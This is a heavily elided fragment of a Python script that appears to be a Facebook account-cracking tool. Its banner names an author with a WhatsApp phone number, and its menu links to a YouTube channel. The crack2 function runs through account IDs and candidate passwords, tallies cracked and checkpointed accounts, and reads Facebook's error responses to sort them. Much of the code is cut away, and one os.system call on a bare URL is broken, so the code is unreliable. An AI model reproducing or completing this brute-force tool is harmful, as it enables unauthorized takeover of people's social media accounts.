...
\x1b[92;1m===================================>\x1b[92;1m
\x1b[93;1m Author       \x1b[92;1m=>      \x1b[93;1mB4DH1N AHMED
\x1b[93;1m Whatsapp     \x1b[92;1m=>      \x1b[93;1m+8801736637029
\x1b[93;1m Page       \x1b[92;1m=>      \x1b[93;1m
\x1b[92;1m===================================>\x1b[92;1m
"""%(h))
...
def menu(): #Bilo
	...
	if farhan in ['1','01']:
		...
		os.system("xdg-open https://youtube.com/channel/UClKb3GFRvzW154pXS5A_PeA")
		exit()
	else:
		os.system("https://youtube.com/channel/UClKb3GFRvzW154pXS5A_PeA")
		exit()
...
def crack2(idf,pwv):
	...
	fff = '%'
	print('\r%s [B4DH1N] %s/%s  OK*%s | CP*%s => %s%s%s'%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x), end=' ');sys.stdout.flush()
		...
		try:
			...
			if "www.facebook.com" in resp.json()["error_msg"]:
				if 'ya' in oprek:
					...
					print('\r%s [B4DH1N-CP] %s|%s        '%(b,idf,pw))
